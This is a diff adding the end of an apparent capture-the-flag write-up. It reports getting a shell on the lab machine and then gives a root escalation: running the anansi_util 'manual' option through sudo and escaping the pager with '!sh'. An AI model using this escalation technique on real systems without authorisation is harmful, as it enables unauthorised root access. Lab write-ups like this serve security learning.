@@ -303,3 +303,27 @@ Boom now since we have shell time to point it to the machine and between it a li
 
 ![image](https://user-images.githubusercontent.com/69868171/116232689-76e23a00-a728-11eb-9d76-8fa3b8c5d139.png)
 
+And boom we have shell.
+
+![image](https://user-images.githubusercontent.com/69868171/116239640-e52afa80-a730-11eb-887a-8792b0cc792a.png)
+
+Now let get root.
+
+![image](https://user-images.githubusercontent.com/69868171/116239914-363aee80-a731-11eb-8c1b-c3b06c2934cc.png)
+
+`sudo -u root /home/anansi/bin/anansi_util manual /bin/bash`
+
+`!sh`
+
+And boom we are root.
+
+![image](https://user-images.githubusercontent.com/69868171/116240591-ff190d00-a731-11eb-8301-826230323a67.png)
+
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
+
+
